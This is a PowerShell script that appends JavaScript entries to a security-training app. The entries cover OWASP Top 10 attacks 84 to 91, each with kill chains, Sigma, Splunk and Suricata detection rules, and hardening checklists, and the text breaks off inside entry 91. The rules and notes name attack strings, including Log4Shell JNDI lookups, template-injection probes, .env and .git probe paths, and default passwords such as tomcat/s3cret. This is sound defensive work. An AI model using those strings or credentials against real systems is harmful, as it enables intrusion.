# PowerShell script to append attacks 84-110 to app.js
$newAttacksCode = @'
  // =========================================================================
  // MODULE 16: OWASP TOP 10 WEB APPLICATION ATTACKS (84 - 93)
  // =========================================================================
  {
    num: 84,
    id: "broken-access-control",
    name: "Broken Access Control",
    shortName: "Broken Access Control",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1548, T1078, T1552",
    primaryTargets: "Web Applications, REST/GraphQL APIs, Administrative Endpoints, Tenant Portals",
    threatActors: "Financial Extortionists, Account Takeover Botnets, Malicious Insiders",
    summary: "Broken Access Control occurs when restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data, such as viewing other users' sensitive accounts, viewing sensitive files, modifying user permissions, or assuming administrative privileges. It includes Insecure Direct Object References (IDOR), missing function-level access control, CORS misconfigurations, and JWT token manipulation.",
    killChain: [
      {
        step: 1,
        title: "Endpoint & Parameter Enumeration",
        mitre: "T1595.002",
        desc: "Probing API endpoints, user ID parameters, and administrative URL routes using automated fuzzing tools like Burp Suite or ffuf."
      },
      {
        step: 2,
        title: "IDOR & Horizontal Boundary Bypass",
        mitre: "T1078",
        desc: "Altering user_id or account_id values in API requests to access and modify records belonging to other tenants without authorization checks."
      },
      {
        step: 3,
        title: "Vertical Privilege Escalation",
        mitre: "T1548",
        desc: "Directly invoking unlinked administrative endpoints (/admin/users, /api/v1/grant_role) or tampering with role claims inside JWT tokens."
      }
    ],
    telemetry: {
      sources: [
        "Web Server & API Gateway Access Logs (Nginx, Kong, AWS API Gateway)",
        "Application Authorization Audit Logs (RBAC/ABAC authorization denial events)",
        "WAF / Cloud Access Logs (Rapid iteration of sequential numeric resource identifiers)"
      ],
      anomalies: [
        "Single session token requesting hundreds of distinct user account records in rapid succession",
        "Requests to administrative URIs from non-privileged IP subnets or user roles",
        "Mismatched authorization context between JWT user ID claim and URI parameter payload"
      ]
    },
    rules: {
      sigma: `title: Potential IDOR Horizontal Privilege Escalation in API
id: b1c2d3e4-f5a6-7b8c-9d0e-1f2a3b4c5d6e
status: production
description: Detects rapid sequential iteration over user ID parameters indicative of Insecure Direct Object Reference (IDOR) exploitation.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains: '/api/v1/users/'
        sc-status: 200
    timeframe: 1m
    condition: selection | count(cs-uri-stem) by c-ip > 50
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548`,
      splunk: `index=web_logs uri_path="/api/v1/users/*" status=200
| rex field=uri_path "/api/v1/users/(?<target_user>[^/]+)"
| stats dc(target_user) as distinct_users by client_ip, user_id
| where distinct_users > 20
| eval Alert="Critical: High Rate of Multi-User Object Access (Potential IDOR / Broken Access Control)"
| table client_ip, user_id, distinct_users, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Potential API IDOR / Access Control Violation Pattern";
    flow:to_server,established;
    content:"/api/"; http_uri;
    content:"user_id="; http_uri;
    classtype:web-application-attack;
    sid:1000084;
    rev:1;
)`,
      sysmon: `# Enforce automated API token permission validation in middleware
grep -rn "req.params.id" ./src/routes/ | grep -v "verifyOwnership"`
    },
    defenseChecklist: [
      { id: "bac_1", title: "Enforce Server-Side Ownership Validation", tier: "Application Logic", desc: "Never trust client-supplied IDs. Verify that the authenticated session owns the requested resource on every single database transaction." },
      { id: "bac_2", title: "Adopt Centralized ABAC / RBAC Middleware", tier: "Architecture", desc: "Enforce consistent role-based or attribute-based access control policies at the API gateway or application middleware layer." },
      { id: "bac_3", title: "Use Non-Sequential UUIDs for Resource Keys", tier: "Data Storage", desc: "Replace guessable auto-incrementing integer IDs with cryptographically random UUIDv4 or ULID identifiers." },
      { id: "bac_4", title: "Disable Directory Browsing & Enforce CORS Whitelist", tier: "Web Server", desc: "Ensure web server directory listing is disabled and CORS origin headers strictly validate allowable domains, rejecting wildcard origins." }
    ]
  },
  {
    num: 85,
    id: "cryptographic-failures",
    name: "Cryptographic Failures",
    shortName: "Cryptographic Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "8.2",
    mitre: "T1552.001, T1040, T1600",
    primaryTargets: "Data in Transit, Data at Rest, Session Tokens, Password Hashes, Payment Card Data (PCI-DSS)",
    threatActors: "Adversary-in-the-Middle (AiTM), Nation-State Intelligence, Ransomware Operators",
    summary: "Formerly known as Sensitive Data Exposure, Cryptographic Failures focus on failures related to cryptography which often lead to sensitive data exposure or system compromise. Common root causes include transmitting data in cleartext (HTTP, FTP, SMTP), utilizing legacy/broken cryptographic algorithms (MD5, SHA-1, RC4, DES), hardcoded secret keys in frontend scripts or repositories, and improper cryptographic salt generation allowing rainbow table cracking.",
    killChain: [
      {
        step: 1,
        title: "Cryptographic Protocol Fingerprinting",
        mitre: "T1595.002",
        desc: "Scanning transport protocols with SSLScan or TestSSL to identify weak ciphers (RC4, 3DES), deprecated TLS versions (SSL 3.0, TLS 1.0/1.1), or missing HSTS."
      },
      {
        step: 2,
        title: "Interception & Downgrade Attack",
        mitre: "T1557",
        desc: "Executing SSL stripping or adversary-in-the-middle attacks to downgrade TLS connections and intercept plaintext credentials and session cookies."
      },
      {
        step: 3,
        title: "Cryptographic Extraction & Hash Cracking",
        mitre: "T1110.002",
        desc: "Extracting unsalted MD5/SHA-1 password hashes or weak AES-ECB encrypted blobs and inverting them using GPU clusters."
      }
    ],
    telemetry: {
      sources: [
        "TLS Inspection Proxy & Load Balancer Logs (HAProxy, F5, Cloudflare TLS telemetry)",
        "Network Packet Analyzers (Zeek SSL/TLS anomaly logs, cleartext HTTP on non-standard ports)",
        "Source Code & Secrets Scanners (GitGuardian, Trufflehog, Semgrep secret detection)"
      ],
      anomalies: [
        "Outbound plaintext transmission of sensitive data fields (Credit card PANs, SSNs, passwords)",
        "Negotiation of deprecated TLS 1.0 / 1.1 or cipher suites utilizing CBC mode without Encrypt-then-MAC",
        "Presence of hardcoded symmetric encryption keys or private RSA keys in application commit history"
      ]
    },
    rules: {
      sigma: `title: Insecure Cleartext Protocol Transmission of Sensitive Data
id: c2d3e4f5-a6b7-8c9d-0e1f-2a3b4c5d6e7f
status: production
description: Detects sensitive authentication or payment keywords transmitted over unencrypted HTTP protocol sessions.
logsource:
    category: network_traffic
detection:
    selection:
        dest_port: 80
        payload|contains:
            - 'password='
            - 'passwd='
            - 'credit_card='
            - 'cvv='
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1552`,
      splunk: `index=network_monitor dest_port=80 (payload="*password*" OR payload="*Bearer *")
| stats count by src_ip, dest_ip, dest_port, payload
| eval Severity="HIGH", Issue="Plaintext Credential Transmission over Cleartext HTTP"
| table _time, src_ip, dest_ip, Issue, payload`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"SEC-ALERT Cleartext Transmission of Password Parameter over HTTP";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"password="; http_client_body;
    classtype:policy-violation;
    sid:1000085;
    rev:1;
)`,
      sysmon: `# Audit all web configs for TLS 1.2/1.3 enforcement and HSTS header
curl -I -s -k https://target-app.internal | grep -i "strict-transport-security"`
    },
    defenseChecklist: [
      { id: "crypto_1", title: "Mandate TLS 1.3 & Disable Deprecated Ciphers", tier: "Perimeter / Network", desc: "Enforce TLS 1.2+ exclusively (preferring TLS 1.3) with PFS ciphers (ECDHE-RSA-AES-GCM); disable SSLv3, TLS 1.0, TLS 1.1, and RC4/3DES." },
      { id: "crypto_2", title: "Enforce Strict HTTP Strict Transport Security (HSTS)", tier: "Web Server", desc: "Send 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' to prevent protocol downgrade and SSL stripping attacks." },
      { id: "crypto_3", title: "Use Argon2id or PBKDF2 with High Work Factors", tier: "Cryptography", desc: "Never use MD5, SHA-1, or plain SHA-256 for passwords. Use Argon2id, bcrypt (cost >= 12), or PBKDF2 with unique cryptographic salts." },
      { id: "crypto_4", title: "Hardware-Backed Key Management (HSM / KMS)", tier: "Cloud / Secrets", desc: "Store master cryptographic keys in hardware security modules (HSM) or cloud KMS with envelope encryption and automated annual rotation." }
    ]
  },
  {
    num: 86,
    id: "owasp-injection",
    name: "Injection (OWASP)",
    shortName: "OWASP Injection",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, T1059",
    primaryTargets: "SQL/NoSQL Interpreters, OS Shells, LDAP Directories, XML Parsers, Template Engines (SSTI)",
    threatActors: "APT Syndicates, Initial Access Brokers, Automated Vulnerability Scanners",
    summary: "Injection flaws occur when untrusted user-supplied data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Encompasses SQL, NoSQL, OS Command Injection, Object-Relational Mapping (ORM) injection, LDAP injection, and Server-Side Template Injection (SSTI).",
    killChain: [
      {
        step: 1,
        title: "Input Boundary Probing",
        mitre: "T1595.002",
        desc: "Submitting special characters (', \", ;, |, `, ${{7*7}}, <!--#exec--) into input fields to identify interpreter reflection and syntax error breaks."
      },
      {
        step: 2,
        title: "Payload Construction & Syntax Smuggling",
        mitre: "T1190",
        desc: "Constructing syntax-valid escape sequences tailored to the interpreter (e.g. NoSQL $ne or ORM HQL injection) to subvert execution logic."
      },
      {
        step: 3,
        title: "Arbitrary Command Execution / Data Exfiltration",
        mitre: "T1059",
        desc: "Executing arbitrary database queries or spawning a reverse bash/PowerShell shell to establish persistence."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Inspection Logs",
        "Application Runtimes & Error Logs (Uncaught SyntaxException, SQLGrammarException)",
        "System Process Creation Logs (Sysmon Event ID 1, Linux auditd execve)"
      ],
      anomalies: [
        "Spike in HTTP 500 errors containing interpreter stack traces or database driver keywords",
        "Web application process (www-data, nginx, w3wp.exe) spawning cmd.exe, powershell.exe, or /bin/sh",
        "Outbound network connections originating directly from the database or web application runtime"
      ]
    },
    rules: {
      sigma: `title: Web Application Spawning System Shell (Command Injection)
id: d3e4f5a6-b7c8-9d0e-1f2a-3b4c5d6e7f8a
status: production
description: Detects command injection where a web server process spawns an interactive shell interpreter.
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/nginx'
            - '/apache2'
            - '/httpd'
            - '/php-fpm'
            - '/node'
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
            - '/python'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=sysmon (ParentImage="*w3wp.exe" OR ParentImage="*nginx.exe" OR ParentImage="*httpd.exe") (Image="*cmd.exe" OR Image="*powershell.exe")
| eval Alert="CRITICAL: Web Server Process Spawned Interactive Command Shell (Possible Injection)"
| table _time, host, ParentImage, Image, CommandLine, User, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Server-Side Template Injection (SSTI) Expression Probe";
    flow:to_server,established;
    content:"{{"; http_client_body;
    content:"}}"; http_client_body;
    pcre:"/\{\{\s*(\d+[\*\+\-\/]\d+|config|self|system)\s*\}\}/i";
    classtype:web-application-attack;
    sid:1000086;
    rev:1;
)`,
      sysmon: `# Monitor Linux auditd for suspicious child processes of web server:
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep apache2 | head -n 1) -k web_execve`
    },
    defenseChecklist: [
      { id: "inj_1", title: "Mandatory Parameterized Queries & ORM Prepared Statements", tier: "Application Logic", desc: "Never concatenate user input directly into SQL, NoSQL, or LDAP queries. Use strictly parameterized queries or safe ORM abstractions." },
      { id: "inj_2", title: "Avoid OS Command Execution Functions", tier: "Secure Coding", desc: "Eliminate calls to exec(), system(), popen(), or eval(). Use native runtime libraries (e.g. child_process.execFile with argument arrays) instead." },
      { id: "inj_3", title: "Sandboxed Template Rendering Engine", tier: "AppSec", desc: "Configure template engines (Jinja2, Thymeleaf, Handlebars) with strict sandboxing enabled, disabling reflection and arbitrary code evaluation." },
      { id: "inj_4", title: "Enforce Runtime Least Privilege & AppArmor / SELinux", tier: "OS Hardening", desc: "Run web processes under non-privileged service accounts without shell access (nologin) and confine with strict SELinux/AppArmor profiles." }
    ]
  },
  {
    num: 87,
    id: "insecure-design",
    name: "Insecure Design",
    shortName: "Insecure Design",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.5",
    mitre: "T1565.001, T1078, T1499",
    primaryTargets: "Business Logic Workflows, Password Recovery Workflows, Financial Checkout, Multi-Tenant Architecture",
    threatActors: "Fraud Rings, Automated Scalping Bots, Competitor Espionage",
    summary: "Insecure Design represents a broad category of architectural weaknesses representing 'missing or ineffective control design'. A secure implementation cannot fix an insecure design. Examples include lack of business logic rate limiting (allowing credential stuffing or coupon hoarding), insecure password recovery flows answering predictable questions, unconstrained file upload destinations, and absent tenant isolation at the architectural blueprint stage.",
    killChain: [
      {
        step: 1,
        title: "Architectural Business Logic Mapping",
        mitre: "T1592",
        desc: "Mapping out application operational workflows (account creation, coupon application, password reset, checkout flows) to discover unmitigated assumptions."
      },
      {
        step: 2,
        title: "Workflow Automation & Boundary Abuse",
        mitre: "T1078",
        desc: "Using bot scripts to execute race conditions on discounts, scrape inventory reservations, or brute-force weak reset PINs without throttling."
      },
      {
        step: 3,
        title: "Business Logic Compromise & Fraud Execution",
        mitre: "T1565",
        desc: "Draining loyalty points, bypassing payment authorization steps, or creating unlimited trial accounts without email verification."
      }
    ],
    telemetry: {
      sources: [
        "Business Logic & Application Transaction Logs",
        "Bot Management Telemetry (Cloudflare Bot Management, AWS WAF Bot Control)",
        "Database Transaction Anomaly Audits"
      ],
      anomalies: [
        "Mass creation of user accounts from rotating IP ranges with identical registration timing profiles",
        "High volume of failed password reset PIN validations with no account lockouts",
        "Negative cart totals or rapid concurrent requests against promotional coupon endpoints"
      ]
    },
    rules: {
      sigma: `title: High Rate of Account Creation from Single Subnet
id: e4f5a6b7-c8d9-0e1f-2a3b-4c5d6e7f8a9b
status: production
description: Detects automated bot-driven account creation indicating business logic abuse and missing anti-automation controls.
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem: '/register'
        sc-status: 201
    timeframe: 5m
    condition: selection | count() by c-ip > 30
level: medium
tags:
    - attack.initial_access
    - attack.t1078`,
      splunk: `index=application_logs action="apply_coupon"
| stats count by session_id, user_id, coupon_code
| where count > 10
| eval Alert="Potential Business Logic Abuse: Concurrent Repeated Coupon Application"
| table _time, session_id, user_id, coupon_code, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Repeated Rapid Password Reset Attempts Against Single User";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/auth/reset-password"; http_uri;
    threshold: type both, track by_dst, count 10, seconds 60;
    classtype:suspicious-login;
    sid:1000087;
    rev:1;
)`,
      sysmon: `# Verify rate limit middleware is registered in express application
grep -rn "rateLimit" ./src/app.js`
    },
    defenseChecklist: [
      { id: "des_1", title: "Mandatory Threat Modeling in SDLC", tier: "Architecture", desc: "Integrate formal threat modeling (STRIDE, PASTA) into initial system design phases before any software engineering code is written." },
      { id: "des_2", title: "Enforce Business Logic Rate Limiting & CAPTCHA", tier: "Application", desc: "Deploy rate limiting, progressive delays, and cryptographic Proof-of-Work / CAPTCHA on all sensitive business workflows (registration, resets)." },
      { id: "des_3", title: "Secure Multi-Tenant Architectural Isolation", tier: "Data Tier", desc: "Enforce strict tenant data partitioning at the database or schema level, ensuring row-level security (RLS) is cryptographically or logically isolated." },
      { id: "des_4", title: "State Machine Validation & Transaction Mutexes", tier: "Application Logic", desc: "Implement strict state machine transitions and atomic database transactions (SELECT FOR UPDATE) to prevent race conditions in financial operations." }
    ]
  },
  {
    num: 88,
    id: "security-misconfiguration",
    name: "Security Misconfiguration",
    shortName: "Security Misconfiguration",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.5",
    mitre: "T1078.001, T1190, T1592",
    primaryTargets: "Cloud Storage Buckets, Default Admin Consoles, Web Frameworks, Error Handlers, HTTP Headers",
    threatActors: "Automated Crawlers, Shodan/Censys Scanners, Opportunistic Attackers",
    summary: "Security Misconfiguration happens when security settings are defined, implemented, and maintained with defaults or insecure values. Examples include unpatched software, enabled unnecessary features or sample pages, default accounts and passwords unchanged, overly verbose error messages exposing stack traces and database versions, misconfigured CORS wildcard headers, and exposed cloud storage buckets allowing anonymous read/write access.",
    killChain: [
      {
        step: 1,
        title: "Automated Attack Surface Scanning",
        mitre: "T1595",
        desc: "Scanning external endpoints using Nuclei, Nikto, or Nmap to locate exposed debug panels (/actuator, /server-status, /.git) and default portals."
      },
      {
        step: 2,
        title: "Default Credential & Configuration Probing",
        mitre: "T1078.001",
        desc: "Attempting factory default credentials (admin/admin, tomcat/s3cret) on administrative dashboards or querying unauthenticated metrics."
      },
      {
        step: 3,
        title: "Information Harvesting & Administrative Takeover",
        mitre: "T1190",
        desc: "Downloading environment variables (.env files), dumping source code from exposed .git directories, or deploying malicious WAR files."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Probes for /.env, /actuator/env, /phpinfo.php, /.git/HEAD)",
        "Cloud Provider IAM & Storage Audit Logs (AWS CloudTrail S3 PutBucketPolicy, GetObject anonymous)",
        "Container & Kubernetes Cluster Audits"
      ],
      anomalies: [
        "Bursts of HTTP 404/403 requests probing standard administrative and configuration paths",
        "Inbound connections to sensitive debugging ports (e.g. 5005, 8080, 9001) from external IP addresses",
        "Stack traces containing database connection strings or internal file system paths returned in HTTP 500 bodies"
      ]
    },
    rules: {
      sigma: `title: Access Probing for Exposed Sensitive Files (.env / .git)
id: f5a6b7c8-d9e0-1f2a-3b4c-5d6e7f8a9b0c
status: production
description: Detects scanning activity targeting exposed environment, configuration, and version control repositories.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '/.env'
            - '/.git/'
            - '/actuator/'
            - '/wp-config.php'
            - '/phpinfo.php'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1592`,
      splunk: `index=web_proxy (cs_uri_stem="*/.env" OR cs_uri_stem="*/.git/HEAD" OR cs_uri_stem="*/actuator/heapdump")
| stats count by c_ip, cs_uri_stem, sc_status
| eval Alert="CRITICAL: Exposure Probing of Environment Variables or Git Metadata"
| table _time, c_ip, cs_uri_stem, sc_status, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Request for Exposed Spring Boot Actuator Endpoint";
    flow:to_server,established;
    content:"/actuator/"; http_uri;
    classtype:attempted-recon;
    sid:1000088;
    rev:1;
)`,
      sysmon: `# Verify production nginx disables server tokens and sensitive dot-file access:
nginx -T | grep -E "server_tokens|location.*\\/\\."`
    },
    defenseChecklist: [
      { id: "mis_1", title: "Automated Golden Image & CIS Hardening", tier: "Infrastructure", desc: "Deploy servers using immutable golden images hardened according to Center for Internet Security (CIS) Benchmarks." },
      { id: "mis_2", title: "Disable Verbose Error Messages & Stack Traces", tier: "Application", desc: "Configure global exception handlers to return generic error messages to clients while logging full debug traces to secure backend SIEM." },
      { id: "mis_3", title: "Block Hidden Files & Development Endpoints", tier: "Web Server", desc: "Explicitly block client access to dot-files (.git, .env) and disable all debugging/actuator endpoints in production builds." },
      { id: "mis_4", title: "Enforce Strict Security Headers (CSP, X-Frame-Options)", tier: "HTTP Headers", desc: "Implement Content-Security-Policy (CSP), X-Frame-Options: DENY, X-Content-Type-Options: nosniff, and Referrer-Policy headers." }
    ]
  },
  {
    num: 89,
    id: "vulnerable-components",
    name: "Vulnerable and Outdated Components",
    shortName: "Vulnerable Components",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1195.002, T1190",
    primaryTargets: "Open Source Libraries, Node.js npm Packages, Java Maven Dependencies, Python PyPI, Web Middleware",
    threatActors: "Supply Chain Threat Actors, Ransomware Pre-Cursor Gangs, State-Sponsored APTs",
    summary: "Components such as libraries, frameworks, and other software modules run with the same privileges as the application itself. If a vulnerable component is exploited, it can facilitate serious data loss or server takeover. Famous examples include Log4Shell (CVE-2021-44228), Spring4Shell (CVE-2022-22965), and Equifax Apache Struts (CVE-2017-5638). Lack of Software Bill of Materials (SBOM) and continuous CVE vulnerability scanning leaves applications exposed for months.",
    killChain: [
      {
        step: 1,
        title: "Software Component Fingerprinting",
        mitre: "T1592.004",
        desc: "Analyzing HTTP response headers, favicon hashes, JavaScript bundle comments, and error messages to identify exact third-party library versions."
      },
      {
        step: 2,
        title: "Public CVE Weaponization",
        mitre: "T1190",
        desc: "Selecting an existing proof-of-concept exploit (e.g. JNDI lookup string for Log4j or crafted payload for Apache Struts) matching the target version."
      },
      {
        step: 3,
        title: "Remote Code Execution via Component",
        mitre: "T1059",
        desc: "Executing arbitrary shellcode through the vulnerable library to drop web shells and establish reverse command connections."
      }
    ],
    telemetry: {
      sources: [
        "Software Composition Analysis (SCA) Pipeline Telemetry (Snyk, Dependabot, OWASP Dependency-Check)",
        "WAF / Edge Signature Detection (Known CVE exploit patterns in User-Agent, URI, and headers)",
        "Endpoint Detection & Response (EDR process parentage analysis)"
      ],
      anomalies: [
        "Inbound requests containing JNDI/LDAP/RMI lookup strings (${jndi:ldap://...}) in arbitrary HTTP headers",
        "Sudden outbound network connections on LDAP (389), RMI (1099), or DNS ports initiated by Java processes",
        "Presence of unpatched critical CVEs in production dependency trees older than 30 days"
      ]
    },
    rules: {
      sigma: `title: Log4j Remote JNDI Lookup Attempt in Web Request
id: a6b7c8d9-e0f1-2a3b-4c5d-6e7f8a9b0c1d
status: production
description: Detects generic Log4j exploitation payloads (CVE-2021-44228) attempting JNDI protocol injection.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - '${jndi:ldap:/'
            - '${jndi:rmi:/'
            - '${jndi:dns:/'
            - '${jndi:iiop:/'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=waf (payload="*\${jndi:*" OR payload="*class.module.classLoader*")
| eval CVE=if(like(payload, "%\${jndi:%"), "CVE-2021-44228 (Log4Shell)", "CVE-2022-22965 (Spring4Shell)")
| stats count by src_ip, dest_ip, CVE, payload
| table _time, src_ip, dest_ip, CVE, count, payload`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Inbound Log4Shell CVE-2021-44228 JNDI Injection Exploit Attempt";
    flow:to_server,established;
    content:"${jndi:"; nocase;
    classtype:attempted-admin;
    sid:1000089;
    rev:1;
)`,
      sysmon: `# Run automated local package vulnerability audit in Node.js project:
npm audit --production --audit-level=high`
    },
    defenseChecklist: [
      { id: "vuln_1", title: "Automated Software Composition Analysis (SCA) in CI/CD", tier: "CI/CD Pipeline", desc: "Integrate automated tools (Snyk, Dependabot, Trivy) into build pipelines to block merges introducing high or critical CVEs." },
      { id: "vuln_2", title: "Generate and Maintain Software Bill of Materials (SBOM)", tier: "Supply Chain", desc: "Generate CycloneDX or SPDX SBOM inventories for all release artifacts to instantly query exposure when new 0-days emerge." },
      { id: "vuln_3", title: "WAF Virtual Patching for Critical CVEs", tier: "Perimeter", desc: "Deploy managed WAF rulesets with immediate virtual patching capabilities to filter known CVE attack signatures while awaiting code updates." },
      { id: "vuln_4", title: "Enforce Rigorous Patch Management SLA", tier: "Governance", desc: "Enforce a strict 7-day remediation SLA for critical severity CVEs and remove unmaintained or dead third-party dependencies." }
    ]
  },
  {
    num: 90,
    id: "auth-failures",
    name: "Identification and Authentication Failures",
    shortName: "Auth Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "8.8",
    mitre: "T1110, T1556, T1078",
    primaryTargets: "User Identity Providers, SSO Endpoints, Session Cookies, OAuth/OIDC Flows, MFA Gateways",
    threatActors: "Account Takeover (ATO) Crews, Credential Stuffing Networks, Phishing Operations",
    summary: "Previously titled Broken Authentication, this category encompasses vulnerabilities where confirmation of the user's identity, authentication, and session management are handled incorrectly. Exploits permit automated credential stuffing, brute-force attacks without rate limits, weak or absent MFA enforcement, session fixation, exposing session identifiers in URLs, and improper invalidation of authentication tokens upon logout.",
    killChain: [
      {
        step: 1,
        title: "Breach Corpus Credential Loading",
        mitre: "T1589.001",
        desc: "Ingesting millions of compromised email/password pairs from underground data dumps into automated credential stuffing engines."
      },
      {
        step: 2,
        title: "Distributed Automated Login Assault",
        mitre: "T1110.004",
        desc: "Routing login requests across residential proxy swarms to evade per-IP rate limits and bypass simple threshold defenses."
      },
      {
        step: 3,
        title: "Session Hijack & Account Takeover",
        mitre: "T1556",
        desc: "Locking out legitimate users, altering registered MFA phone numbers, and siphoning stored credit cards and reward points."
      }
    ],
    telemetry: {
      sources: [
        "Authentication Provider Logs (Okta, Azure AD, Auth0, Cognito login telemetry)",
        "Web Application Login Endpoint Telemetry (HTTP 401 vs 200 response ratios)",
        "User Identity Threat Detection (Simultaneous geographically impossible logins)"
      ],
      anomalies: [
        "Massive spike in failed login attempts (HTTP 401) against /login across hundreds of user accounts",
        "Geographically impossible travel logins (e.g. successful login from New York followed 10 minutes later by London)",
        "Login attempts utilizing known breached username/password combinations"
      ]
    },
    rules: {
      sigma: `title: High Volume Distributed Credential Stuffing Attack
id: b7c8d9e0-f1a2-3b4c-5d6e-7f8a9b0c1d2e
status: production
description: Detects credential stuffing characterized by high volume of 401 Unauthorized responses across diverse source IPs.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem: '/api/v1/auth/login'
        sc-status: 401
    timeframe: 5m
    condition: selection | count() > 500
level: high
tags:
    - attack.credential_access
    - attack.t1110.004`,
      splunk: `index=auth_logs action="login_failure"
| stats count as failure_count, dc(username) as targeted_users by client_ip
| where failure_count > 50 AND targeted_users > 20
| eval Alert="CRITICAL: Password Spraying / Distributed Credential Stuffing Detected"
| table _time, client_ip, targeted_users, failure_count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Rapid Brute Force Login Sequence Against Authentication API";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/login"; http_uri;
    threshold: type both, track by_src, count 25, seconds 30;
    classtype:suspicious-login;
    sid:1000090;
    rev:1;
)`,
      sysmon: `# Verify session cookie flags:
curl -I https://target-app.internal/login | grep -i "Set-Cookie" | grep -E "HttpOnly|Secure|SameSite"`
    },
    defenseChecklist: [
      { id: "auth_1", title: "Mandatory Phishing-Resistant MFA (FIDO2 / WebAuthn)", tier: "Authentication", desc: "Mandate hardware security keys or biometric FIDO2/WebAuthn for all accounts; eliminate SMS and push notification MFA." },
      { id: "auth_2", title: "Adaptive Risk-Based Rate Limiting & Account Lockout", tier: "Application", desc: "Deploy adaptive rate limiting per IP and per username with exponential backoff and CAPTCHA after 5 failed attempts." },
      { id: "auth_3", title: "Hardened Session Cookie Configuration", tier: "Session Management", desc: "Ensure all session cookies include 'Secure; HttpOnly; SameSite=Strict' flags and rotate session IDs upon authentication status changes." },
      { id: "auth_4", title: "Screen Against Known Breached Passwords", tier: "Identity Governance", desc: "Integrate HaveIBeenPwned API or Active Directory password protection to prevent users from selecting known breached passwords." }
    ]
  },
  {
    num: 91,
    id: "integrity-failures",
    name: "Software and Data Integrity Failures",
    shortName: "Integrity Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1195, T1059, T1565",
    primaryTargets: "CI/CD Deployment Pipelines, Auto-Update Mechanisms, Insecure Deserialization, Untrusted CDNs",
    threatActors: "Supply Chain APTs (SolarWinds style), Malicious Package Maintainers, Package Typosquatters",
    summary: "Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes applications relying on plugins, libraries, or modules from untrusted sources, insecure CI/CD build pipelines that lack cryptographic verification, auto-update mechanisms downloading unsigned binaries, and insecure deserialization flaws where untrusted serialized objects are parsed without validation, triggering arbitrary remote code execution.",
    killChain: [
      {
        step: 1,
        title: "Upstream Package Compromise / Typosquatting",
        mitre: "T1195.001",
        desc: "Compromising developer credentials to push backdoored code to public repositories or registering typosquatted package names."
      },
      {
        step: 2,
        title: "Unverified Pipeline Ingestion",
        mitre: "T1195.002",
        desc: "Target application build pipeline downloads the malicious dependency without verifying cryptographic SHA-256 hashes or signatures."
      },
      {
        step: 3,
        title: "Malicious Deserialization / Payload Trigger",
        mitre: "T1059",
        desc: "Backdoor executes during application startup or unmarshaling of untrusted Java/Python serialized objects, granting full C2 access."
      }
    ],
    telemetry: {
      sources: [
        "CI/CD Runner Telemetry (GitHub Actions, GitLab CI audit logs)",
        "Artifact Repository Signatures (Cosign, Sigstore, Notary verification logs)",
        "Application Exception Logs (ClassNotFoundException, Deserialization security warnings)"
      ],
      anomalies: [
        "Build runner executing outbound curl/wget commands to external IPs during dependency resolution",
        "Discrepancy between committed package-lock.json hashes and registry downloaded package signatures",
        "Invocation of dangerous deserialization classes (e.g. ObjectInputStream.readObject, pickle.loads)"
      ]
    },
    rules: {
      sigma: `title: Suspicious CI/CD Runner Outbound Network Connection
id: c8d9e0f1-a2b3-4c5d-6e7f-8a9b0c1d2e3f
status: production
description: Detects build runner executing outbound connections to unapproved external endpoints during pipeline build.
logsource:
    category: network_connection
